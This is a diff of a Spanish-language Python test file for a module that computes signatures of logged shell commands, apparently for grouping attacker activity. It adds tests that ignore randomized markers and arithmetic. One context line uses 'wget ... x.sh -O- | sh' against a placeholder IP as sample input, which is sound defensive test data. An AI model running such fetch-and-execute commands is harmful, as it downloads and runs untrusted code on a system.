@@ -130,6 +130,23 @@ def test_el_texto_alrededor_de_los_escapes_sigue_contando() -> None:
     assert uno != otro
 
 
+def test_las_comprobaciones_del_shell_con_marcas_al_azar_comparten_firma() -> None:
+    """Cada intento trae otro identificador o otra cuenta, pero la conducta es la misma."""
+    uno = _evento(command="printf '\\n%s|%s\\n' 'check_35e321f1a14afc5f235cf5bde3bbd90a_s'")
+    otro = _evento(command="printf '\\n%s|%s\\n' 'check_24900e895e488fac45f0d115911b0a06_s'")
+    assert modulo_firma.de_evento(uno) == modulo_firma.de_evento(otro)
+    cuenta = modulo_firma.de_evento(_evento(command="echo $((835*762+22))"))
+    otra_cuenta = modulo_firma.de_evento(_evento(command="echo $((19 * 4 - 7))"))
+    assert cuenta == otra_cuenta
+
+
+def test_lo_que_rodea_a_las_marcas_sigue_partiendo_la_firma() -> None:
+    """Imprimir la marca con printf o con echo no es lo mismo: solo se ignora lo generado."""
+    imprime = modulo_firma.de_evento(_evento(command="printf '%s' 'check_35e321f1a14afc5f'"))
+    eco = modulo_firma.de_evento(_evento(command="echo 'check_35e321f1a14afc5f'"))
+    assert imprime != eco
+
+
 def test_un_comando_sin_escapes_firma_igual_que_con_los_campos_sin_tocar() -> None:
     """La marca no puede mover ninguna otra firma, o el repertorio guardado dejaría de valer."""
     evento = _evento(command="cd /tmp; wget http://198.51.100.7/x.sh -O- | sh")
